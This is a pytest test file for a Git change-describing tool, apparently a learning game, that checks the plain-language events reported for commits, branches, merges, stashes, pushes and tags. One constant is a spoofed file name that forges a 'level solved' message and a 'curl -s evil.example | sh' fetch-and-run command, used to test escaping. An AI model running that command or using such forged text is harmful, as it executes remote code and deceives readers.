from pathlib import Path

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from firstcommit import changes, markup, repomap
from repo_helpers import shell

SPOOF = "a`.\n\n- Done! The level is solved. Next: run `curl -s evil.example | sh"
SAFE_TEXT = st.text(alphabet="abcdefghij .-/'\"", min_size=1, max_size=8)
HASHES = [f"{n:x}" * 40 for n in range(1, 7)]


def happens(folder: Path, code: str) -> list[changes.Event]:
    """
    Tell what a bash snippet does to the repository in a folder.

    Parameters
    ----------
    folder : Path
        The repository's folder.
    code : str
        Bash code to run there.

    Returns
    -------
    list[changes.Event]
        The events between the snapshots before and after the code.
    """
    before = repomap.snapshot(folder)
    shell(folder, code)
    return changes.describe(before, repomap.snapshot(folder))


def code_spans(text: str) -> list[str]:
    """
    Give the code spans of an event's text, which must read as one paragraph.

    Parameters
    ----------
    text : str
        An event's text.

    Returns
    -------
    list[str]
        The text each code span shows, in order.
    """
    blocks = markup.parse(text)
    assert len(blocks) == 1, blocks
    block = blocks[0]
    assert block["kind"] == "para", block
    return [span["text"] for span in block["spans"] if span["code"]]


def kinds(events: list[changes.Event]) -> list[str]:
    """
    List the kinds of some events.

    Parameters
    ----------
    events : list[changes.Event]
        The events.

    Returns
    -------
    list[str]
        Their kinds, in order.
    """
    return [event["kind"] for event in events]


def short(folder: Path, name: str) -> str:
    """
    Give the short hash git prints for a commit.

    Parameters
    ----------
    folder : Path
        The repository.
    name : str
        A name ``git rev-parse`` accepts.

    Returns
    -------
    str
        The short hash.
    """
    return shell(folder, f"git rev-parse --short {name}").strip()


def project(tmp_path: Path, code: str = "") -> Path:
    """
    Create a repository with one commit of ``a.txt`` on ``main`` and run code in it.

    Parameters
    ----------
    tmp_path : Path
        The test's folder.
    code : str
        Bash code to run in the repository afterwards.

    Returns
    -------
    Path
        The repository.
    """
    repo = tmp_path / "project"
    shell(tmp_path, "git init -q -b main project && cd project && echo one > a.txt && git add a.txt && git commit -q -m 'Add a'")
    if code:
        shell(repo, code)
    return repo


def test_creating_a_repository_is_told_alone(tmp_path: Path) -> None:
    (tmp_path / "project").mkdir()
    events = happens(tmp_path / "project", "echo hi > notes.txt && git init -q -b main")
    assert kinds(events) == ["repository-created"]
    assert "`main`" in events[0]["text"]


def test_a_cloned_repository_is_told_with_its_branch_and_commit(tmp_path: Path) -> None:
    project(tmp_path)
    before = repomap.snapshot(tmp_path / "copy")
    shell(tmp_path, "git clone -q project copy")
    events = changes.describe(before, repomap.snapshot(tmp_path / "copy"))
    assert kinds(events) == ["repository-created"]
    assert f"`{short(tmp_path / 'project', 'HEAD')}` (`Add a`)" in events[0]["text"]


def test_creating_a_bare_repository(tmp_path: Path) -> None:
    (tmp_path / "github.git").mkdir()
    assert kinds(happens(tmp_path / "github.git", "git init -q --bare")) == ["repository-created"]


def test_removing_the_repository_is_told_alone(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo two > a.txt")
    assert kinds(happens(repo, "rm -rf .git")) == ["repository-removed"]


def test_a_commit_names_its_hash_subject_branch_and_parent(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo two > a.txt && git add a.txt")
    parent = short(repo, "HEAD")
    events = happens(repo, "git commit -q -m 'Change a'")
    assert events == [{"kind": "commit-created", "text": f'Commit `{short(repo, "HEAD")}` (`Change a`) was made on branch `main`; its parent is `{parent}`.'}]


def test_committing_every_change_at_once_also_tells_the_staging(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo two > a.txt")
    assert kinds(happens(repo, "git commit -q -am 'Change a'")) == ["commit-created", "file-staged"]


def test_the_first_commit_starts_the_history_and_needs_no_branch_event(tmp_path: Path) -> None:
    shell(tmp_path, "git init -q -b main project && echo one > project/a.txt && git -C project add a.txt")
    events = happens(tmp_path / "project", "git commit -q -m 'Add a'")
    assert kinds(events) == ["commit-created"]
    assert "no parent" in events[0]["text"]


def test_a_merge_commit_names_both_parents(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q -c feature && echo f > f.txt && git add f.txt && git commit -q -m feature && git switch -q main && echo m > m.txt && git add m.txt && git commit -q -m main")
    ours, theirs = short(repo, "main"), short(repo, "feature")
    events = happens(repo, "git merge -q --no-edit feature")
    assert kinds(events) == ["commit-created"]
    assert events[0]["text"].startswith("Merge commit")
    assert f"`{ours}` and `{theirs}`" in events[0]["text"]


def test_an_amended_commit_is_told_as_replaced(tmp_path: Path) -> None:
    repo = project(tmp_path)
    old = short(repo, "HEAD")
    events = happens(repo, "git commit -q --amend -m 'Add a, better'")
    assert kinds(events) == ["commit-replaced"]
    assert f"`{old}`" in events[0]["text"]
    assert f"`{short(repo, 'HEAD')}` (`Add a, better`)" in events[0]["text"]


def test_a_commit_on_a_branch_just_switched_to_is_told_as_the_switch_and_the_new_branch(tmp_path: Path) -> None:
    repo = project(tmp_path)
    events = happens(repo, "git switch -q -c feature && git commit -q --allow-empty -m 'Start feature'")
    assert kinds(events) == ["branch-switched", "branch-created"]
    assert "(`Start feature`)" in events[0]["text"]


def test_a_commit_on_a_detached_head_says_so(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q --detach")
    events = happens(repo, "git commit -q --allow-empty -m experiment")
    assert kinds(events) == ["commit-created"]
    assert "detached HEAD" in events[0]["text"]


def test_staging_and_unstaging_files(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo two > a.txt && echo new > b.txt")
    events = happens(repo, "git add a.txt b.txt")
    assert events == [
        {"kind": "file-staged", "text": "`a.txt` was staged."},
        {"kind": "file-staged", "text": "`b.txt` was staged as a new file."},
    ]
    assert kinds(happens(repo, "git restore --staged a.txt b.txt")) == ["file-unstaged", "file-unstaged"]


def test_staging_a_deletion(tmp_path: Path) -> None:
    repo = project(tmp_path)
    assert kinds(happens(repo, "git rm -q a.txt")) == ["file-staged", "file-deleted"]


def test_files_created_changed_and_deleted_in_the_working_folder(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo one > b.txt && git add b.txt && git commit -q -m 'Add b'")
    events = happens(repo, "echo two > a.txt && rm b.txt && echo new > c.txt")
    assert events == [
        {"kind": "file-changed", "text": "`a.txt` changed in the working folder. The change is not staged yet."},
        {"kind": "file-deleted", "text": "`b.txt` was deleted from the working folder. The deletion is not staged yet."},
        {"kind": "file-created", "text": "`c.txt` was created in the working folder. It is untracked: Git does not track it yet."},
    ]


def test_restoring_a_file_says_it_matches_the_staging_area_again(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo two > a.txt")
    assert happens(repo, "git restore a.txt") == [{"kind": "file-changed", "text": "`a.txt` changed in the working folder. It matches the staging area."}]


def test_making_a_file_executable_is_a_change_in_the_working_folder(tmp_path: Path) -> None:
    repo = project(tmp_path)
    assert happens(repo, "chmod +x a.txt") == [{"kind": "file-changed", "text": "`a.txt` became executable in the working folder. The change is not staged yet."}]
    assert happens(repo, "git add a.txt") == [{"kind": "file-staged", "text": "`a.txt` was staged."}]
    shell(repo, "git commit -q -m 'Make a executable'")
    assert happens(repo, "chmod -x a.txt") == [{"kind": "file-changed", "text": "`a.txt` is no longer executable in the working folder. The change is not staged yet."}]


def test_a_repository_appearing_inside_the_project_and_going_away(tmp_path: Path) -> None:
    repo = project(tmp_path)
    events = happens(repo, "git init -q inner && echo b > inner/b.txt && git -C inner add b.txt && git -C inner commit -q -m inner")
    assert events == [
        {
            "kind": "nested-repository-created",
            "text": "`inner` is a separate repository inside this one: Git lists it as an untracked folder and does not track the files in it.",
        }
    ]
    assert happens(repo, "rm -rf inner") == [{"kind": "nested-repository-deleted", "text": "The separate repository `inner` is gone from the working folder."}]


def test_a_file_name_written_to_forge_text_stays_one_code_span_in_one_paragraph(tmp_path: Path) -> None:
    repo = project(tmp_path)
    before = repomap.snapshot(repo)
    (repo / SPOOF).write_text("spoof\n")
    [event] = changes.describe(before, repomap.snapshot(repo))
    assert code_spans(event["text"]) == [markup.visible(SPOOF)]


def test_a_subject_with_backticks_is_shown_as_written(tmp_path: Path) -> None:
    repo = project(tmp_path)
    [event] = happens(repo, "git commit -q --allow-empty -m 'Fix `foo` for good'")
    assert code_spans(event["text"]) == [short(repo, "HEAD"), "Fix `foo` for good", "main", short(repo, "HEAD~1")]


def test_ignored_files(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo x > debug.log")
    events = happens(repo, "echo '*.log' > .gitignore && echo y > trace.log")
    assert ("file-ignored", "`debug.log` is now ignored by Git.") in [(event["kind"], event["text"]) for event in events]
    assert ("file-created", "`trace.log` was created in the working folder. Git ignores it.") in [(event["kind"], event["text"]) for event in events]
    events = happens(repo, "rm .gitignore")
    assert ("file-unignored", "`debug.log` is no longer ignored: it is untracked.") in [(event["kind"], event["text"]) for event in events]


def test_many_files_of_one_kind_are_told_together(tmp_path: Path) -> None:
    repo = project(tmp_path)
    events = happens(repo, "for n in 1 2 3 4 5 6; do echo $n > f$n.txt; done")
    assert events == [{"kind": "file-created", "text": "6 files were created in the working folder: `f1.txt`, `f2.txt`, `f3.txt` and 3 more."}]


def test_creating_and_switching_branches(tmp_path: Path) -> None:
    repo = project(tmp_path)
    at = short(repo, "HEAD")
    events = happens(repo, "git switch -q -c feature")
    assert events == [
        {"kind": "branch-switched", "text": f'HEAD switched from branch `main` to branch `feature`, at `{at}` (`Add a`).'},
        {"kind": "branch-created", "text": f'Branch `feature` was created at `{at}` (`Add a`).'},
    ]
    assert kinds(happens(repo, "git switch -q main && git branch -q -d feature")) == ["branch-switched", "branch-deleted"]


def test_switching_branches_tells_no_file_events_for_files_that_follow_head(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q -c feature && echo f > a.txt && echo g > g.txt && git add . && git commit -q -m f")
    assert kinds(happens(repo, "git switch -q main")) == ["branch-switched"]


def test_renaming_a_branch(tmp_path: Path) -> None:
    repo = project(tmp_path)
    assert happens(repo, "git branch -m trunk") == [{"kind": "branch-renamed", "text": "Branch `main` was renamed to `trunk`."}]


def test_a_detached_head_and_moving_it(tmp_path: Path) -> None:
    repo = project(tmp_path, "git commit -q --allow-empty -m two")
    events = happens(repo, "git switch -q --detach HEAD~1")
    assert kinds(events) == ["head-detached"]
    assert f"`{short(repo, 'HEAD')}` (`Add a`)" in events[0]["text"]
    assert kinds(happens(repo, "git switch -q --detach main")) == ["head-moved"]
    assert kinds(happens(repo, "git switch -q main")) == ["branch-switched"]


def test_a_fast_forward_moves_the_branch_forward(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q -c feature && git commit -q --allow-empty -m f1 && git commit -q --allow-empty -m f2 && git switch -q main")
    events = happens(repo, "git merge -q feature")
    assert events == [{"kind": "branch-moved", "text": f'Branch `main` moved forward by 2 commits, from `{short(repo, "main~2")}` to `{short(repo, "main")}` (`f2`).'}]


def test_a_reset_moves_the_branch_back(tmp_path: Path) -> None:
    repo = project(tmp_path, "git commit -q --allow-empty -m two")
    events = happens(repo, "git reset -q --hard HEAD~1")
    assert kinds(events) == ["branch-moved"]
    assert "moved back" in events[0]["text"]


def test_a_merge_with_a_conflict_starts_flags_resolves_and_finishes(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q -c feature && echo theirs > a.txt && git commit -q -am theirs && git switch -q main && echo ours > a.txt && git commit -q -am ours")
    started = happens(repo, "git merge -q feature >/dev/null || true")
    assert started == [
        {"kind": "merge-started", "text": "A merge is in progress on branch `main`."},
        {"kind": "conflict", "text": "`a.txt` has a conflict: Git could not combine the two versions by itself."},
    ]
    resolved = happens(repo, "echo both > a.txt && git add a.txt")
    assert kinds(resolved) == ["conflict-resolved"]
    finished = happens(repo, "git commit -q --no-edit")
    assert kinds(finished) == ["merge-finished", "commit-created"]


def test_an_abandoned_merge_says_the_branch_did_not_move(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q -c feature && echo theirs > a.txt && git commit -q -am theirs && git switch -q main && echo ours > a.txt && git commit -q -am ours")
    shell(repo, "git merge -q feature >/dev/null || true")
    events = happens(repo, "git merge --abort")
    assert events == [{"kind": "merge-aborted", "text": f'The merge was aborted: branch `main` points at `{short(repo, "HEAD")}` (`ours`), as before it started.'}]


def test_a_rebase_starts_with_head_detached_and_finishes_rewriting_the_branch(tmp_path: Path) -> None:
    repo = project(tmp_path, "git switch -q -c feature && echo f > f.txt && git add f.txt && git commit -q -m f && git switch -q main && git commit -q --allow-empty -m m && git switch -q feature")
    events = happens(repo, "GIT_SEQUENCE_EDITOR='sed -i 1s/pick/edit/' git rebase -q -i main 2>/dev/null")
    assert kinds(events) == ["rebase-started"]
    old = short(repo, "feature")
    events = happens(repo, "git rebase --continue >/dev/null 2>&1")
    assert kinds(events) == ["rebase-finished", "branch-moved"]
    assert f"instead of `{old}`" in events[1]["text"]


def test_stash_saved_applied_and_dropped(tmp_path: Path) -> None:
    repo = project(tmp_path, "echo two > a.txt")
    assert kinds(happens(repo, "git stash -q")) == ["stash-saved"]
    assert kinds(happens(repo, "git stash pop -q")) == ["stash-applied", "file-changed"]
    shell(repo, "git stash -q")
    assert kinds(happens(repo, "git stash drop -q")) == ["stash-dropped"]


def test_a_fetch_moves_the_remote_tracking_branch_and_counts_new_commits(tmp_path: Path) -> None:
    project(tmp_path)
    shell(tmp_path, "git clone -q --bare project github.git && git clone -q github.git clone")
    shell(tmp_path / "project", "git commit -q --allow-empty -m two && git push -q ../github.git main")
    events = happens(tmp_path / "clone", "git fetch -q")
    assert kinds(events) == ["remote-updated"]
    assert "`origin/main`" in events[0]["text"]
    assert "1 new commit came from the remote" in events[0]["text"]


def test_a_pull_moves_the_branch_forward_without_claiming_a_local_commit(tmp_path: Path) -> None:
    project(tmp_path)
    shell(tmp_path, "git clone -q --bare project github.git && git clone -q github.git clone")
    shell(tmp_path / "project", "git commit -q --allow-empty -m two && git push -q ../github.git main")
    assert kinds(happens(tmp_path / "clone", "git pull -q --ff-only")) == ["branch-moved", "remote-updated"]


def test_a_push_is_seen_on_the_bare_repository(tmp_path: Path) -> None:
    project(tmp_path)
    shell(tmp_path, "git clone -q --bare project github.git && git clone -q github.git clone")
    github = tmp_path / "github.git"
    before = repomap.snapshot(github)
    shell(tmp_path / "clone", "git commit -q --allow-empty -m two && git push -q && git push -q origin HEAD:refs/heads/topic")
    events = changes.describe(before, repomap.snapshot(github))
    assert kinds(events) == ["push-received", "push-received"]
    assert events[0]["text"].startswith("A push created branch `topic`")
    assert events[1]["text"].startswith("A push moved branch `main`")
    assert "force" not in events[1]["text"]
    rewritten = happens(tmp_path / "clone", "git commit -q --amend --allow-empty -m 'two, again' && git push -q --force")
    assert kinds(rewritten) == ["branch-moved", "remote-updated"]
    assert "rewritten" in rewritten[0]["text"]


def test_a_force_push_says_so(tmp_path: Path) -> None:
    project(tmp_path)
    shell(tmp_path, "git clone -q --bare project github.git && git clone -q github.git clone")
    github = tmp_path / "github.git"
    before = repomap.snapshot(github)
    shell(tmp_path / "clone", "git commit -q --amend --allow-empty -m 'Add a, again' && git push -q --force")
    events = changes.describe(before, repomap.snapshot(github))
    assert kinds(events) == ["push-received"]
    assert "force push" in events[0]["text"]


def test_tags_created_and_deleted(tmp_path: Path) -> None:
    repo = project(tmp_path)
    assert happens(repo, "git tag v1") == [{"kind": "tag-created", "text": f'Tag `v1` was created at `{short(repo, "HEAD")}` (`Add a`).'}]
    shell(repo, "git commit -q --allow-empty -m two")
    assert happens(repo, "git tag -f v1 >/dev/null") == [{"kind": "tag-moved", "text": f'Tag `v1` now points at `{short(repo, "HEAD")}` (`two`) instead of `{short(repo, "HEAD~1")}`.'}]
    assert kinds(happens(repo, "git tag -d v1 >/dev/null")) == ["tag-deleted"]


def snapshots(names: st.SearchStrategy[str]) -> st.SearchStrategy[repomap.Snapshot]:
    """
    Generate snapshots, coherent or not, from small pools of hashes and the given names.

    Most are existing repositories with a working folder, so that pairs of them differ in
    commits, refs and files rather than only in whether a repository exists.

    Parameters
    ----------
    names : st.SearchStrategy[str]
        Branch, ref and file names to draw from.

    Returns
    -------
    st.SearchStrategy[repomap.Snapshot]
        Snapshots.
    """
    hashes = st.sampled_from(HASHES)
    maybe_hash = st.none() | hashes
    commits = st.builds(
        repomap.Commit,
        hash=hashes,
        short=st.sampled_from([h[:7] for h in HASHES]),
        parents=st.lists(hashes, max_size=2),
        subject=names,
        author=names,
        time=st.integers(0, 2**31),
    )
    refs = st.builds(repomap.Ref, name=names, kind=st.sampled_from(["branch", "remote", "tag"]), target=hashes)
    maybe_mode = st.sampled_from([None, "100644", "100755", "120000", "160000"])
    files = st.builds(
        repomap.FileEntry,
        path=names,
        head=maybe_hash,
        index=maybe_hash,
        folder=maybe_hash,
        head_mode=maybe_mode,
        index_mode=maybe_mode,
        folder_mode=maybe_mode,
        ignored=st.booleans(),
        conflicted=st.booleans(),
        repository=st.booleans(),
        index_change=st.sampled_from([None, "added", "modified", "deleted", "typechange"]),
        folder_change=st.sampled_from([None, "modified", "deleted", "typechange", "untracked", "ignored"]),
    )
    return st.builds(
        repomap.Snapshot,
        exists=st.sampled_from([True, True, True, False]),
        bare=st.sampled_from([False, False, False, True]),
        head=maybe_hash,
        branch=st.none() | names,
        commits=st.lists(commits, max_size=5),
        refs=st.lists(refs, max_size=5),
        files=st.lists(files, max_size=8),
        operation=st.sampled_from([None, "merge", "rebase", "cherry-pick", "revert", "bisect"]),
        stash=st.integers(0, 3),
        truncated=st.booleans(),
    )


@pytest.mark.slow
@settings(deadline=None)
@given(snapshots(SAFE_TEXT))
def test_no_change_tells_nothing(snap: repomap.Snapshot) -> None:
    assert changes.describe(snap, snap) == []


@pytest.mark.slow
@settings(deadline=None)
@given(snapshots(st.text()), snapshots(st.text()))
def test_any_pair_of_snapshots_is_described_without_error(before: repomap.Snapshot, after: repomap.Snapshot) -> None:
    for event in changes.describe(before, after):
        assert event["kind"]
        assert event["text"]


@pytest.mark.slow
@settings(deadline=None)
@given(snapshots(SAFE_TEXT), snapshots(SAFE_TEXT))
def test_every_name_and_hash_an_event_quotes_is_in_one_of_the_snapshots(before: repomap.Snapshot, after: repomap.Snapshot) -> None:
    names: set[str] = set()
    hashes: set[str] = set()
    for snap in (before, after):
        names |= {ref["name"] for ref in snap["refs"]} | {file["path"] for file in snap["files"]} | {snap["branch"] or ""}
        names |= {commit["short"] for commit in snap["commits"]} | {commit["subject"] for commit in snap["commits"]}
        hashes |= {commit["hash"] for commit in snap["commits"]} | {ref["target"] for ref in snap["refs"]} | {snap["head"] or ""}
        hashes |= {parent for commit in snap["commits"] for parent in commit["parents"]}
    for event in changes.describe(before, after):
        for quoted in code_spans(event["text"]):
            assert quoted in names or any(full.startswith(quoted) for full in hashes if full), (quoted, event["text"])
